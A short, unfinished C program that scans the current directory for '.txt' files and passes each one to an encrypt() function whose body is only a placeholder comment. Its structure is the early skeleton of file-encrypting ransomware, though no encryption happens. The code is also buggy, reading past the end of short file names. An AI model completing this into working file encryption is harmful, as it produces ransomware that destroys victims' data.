#include <stdio.h>
#include <dirent.h>
#include <string.h>

void encrypt(char* file_name)
{
	// <under construction>
}

void get_fsize(char* file_name, size_t file_size)
{
    for (unsigned int i = 0; i < file_size; i++)
    {
        if (file_name[i] == '.' &&
            file_name[i+1] == 't' &&
            file_name[i+2] == 'x' &&
            file_name[i+3] == 't'
           )
        {
            encrypt(file_name);
        }

    }
}

void get_files()
{
    struct dirent* file;
    DIR* directory = opendir(".");
    while ((file = readdir(directory)))
    {
        get_fsize(file->d_name, strlen(file->d_name));
    }
}

void main()
{
    get_files();
}
